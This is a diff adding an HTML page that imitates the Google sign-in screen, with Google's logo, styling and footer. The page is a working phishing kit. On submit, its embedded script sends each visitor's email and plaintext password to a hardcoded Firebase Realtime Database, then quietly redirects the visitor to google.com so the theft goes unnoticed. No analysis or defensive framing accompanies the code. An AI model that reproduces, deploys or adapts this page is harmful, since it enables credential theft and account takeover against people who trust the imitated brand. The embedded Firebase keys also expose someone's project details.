@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign-In</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 360px;
+            margin: 80px auto;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border: 1px solid #dadce0;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: calc(100% - 20px);
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .btn {
+            width: 100%;
+            background: #1a73e8;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn:hover {
+            background: #1765c1;
+        }
+        .links {
+            text-align: left;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        .links a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 25px;
+        }
+    </style>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+        
+        // Your Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAKC7Q2nZiXGlgLoRGYV3ZK8DHkqZolXK4",
+            authDomain: "signin-9b208.firebaseapp.com",
+            databaseURL: "https://signin-9b208-default-rtdb.firebaseio.com",
+            projectId: "signin-9b208",
+            storageBucket: "signin-9b208.firebasestorage.app",
+            messagingSenderId: "240388769116",
+            appId: "1:240388769116:web:656030ed114f3125736d99"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Submit form data to Firebase
+        document.addEventListener("submit", function(event) {
+            event.preventDefault();  // Prevent form from refreshing page
+            
+            const email = document.querySelector("input[type='email']").value;
+            const password = document.querySelector("input[type='password']").value;
+            
+            // Save to Firebase Realtime Database
+            set(ref(database, 'users/' + email.replace(".", "_")), {
+                email: email,
+                password: password
+            }).then(() => {
+                console.log("Data saved successfully!");
+
+                // Redirect user to www.google.com after successful data submission
+                window.location.href = "https://www.google.com";
+            }).catch((error) => {
+                console.error("Error saving data:", error);
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google Logo">
+        <h2>Sign in</h2>
+        <form>
+            <input type="email" class="input-field" placeholder="Email or phone" required>
+            <input type="password" class="input-field" placeholder="Enter your password" required>
+            <div class="links">
+                <a href="#">Forgot password?</a>
+            </div>
+            <button type="submit" class="btn">Next</button>
+        </form>
+        <div class="links">
+            <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+        </div>
+        <p class="footer">© 2025 Google • <a href="#">Privacy</a> • <a href="#">Terms</a></p>
+    </div>
+</body>
+</html>
